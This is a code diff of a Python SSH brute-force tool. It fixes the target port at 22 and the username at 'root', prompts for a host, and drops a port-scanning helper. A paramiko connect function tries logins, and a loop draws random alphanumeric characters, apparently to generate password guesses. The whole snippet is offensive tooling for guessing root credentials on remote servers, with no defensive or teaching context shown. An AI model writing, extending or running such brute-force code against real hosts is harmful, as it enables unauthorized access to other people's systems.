@@ -5,35 +5,13 @@ global host, username, port, chars
 
 chars = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
 used = []
+port = 22
 try:
 	host = input("[*] Host? ")
-	port = int(input("[*] Port? "))
 except KeyboardInterrupt:
 	print("[-] KeyboardInterrupt...")
 
 username = "root"
-
-
-def scan_host(host, port, r_code = 1):
-	try:
-		s = socket(AF_INET, SOCK_STREAM)
-		code = s.connect_ex((host, port))
-
-		if code == 0:
-			r_code = code
-		s.close
-	except Exception:
-		pass
-	return(r_code)
-
-
-hostip = gethostbyname(host)
-response = scan_host(host, port)
-if response == 0:
-	isopen = False
-else:
-	isopen = True
-
 
 def ssh_connect(password, code = 0):
 	ssh = paramiko.SSHClient()
@@ -47,12 +25,6 @@ def ssh_connect(password, code = 0):
 		code = 2
 	ssh.close()
 	return(code)
-
-if isopen != True:
-	print("[-] Port %s is not open." % (port))
-	sys.exit(1)
-else:
-	print("[*] Port %s open, bruteforcing..." % (port))
 
 while True:
 	no = randint(0, 61)
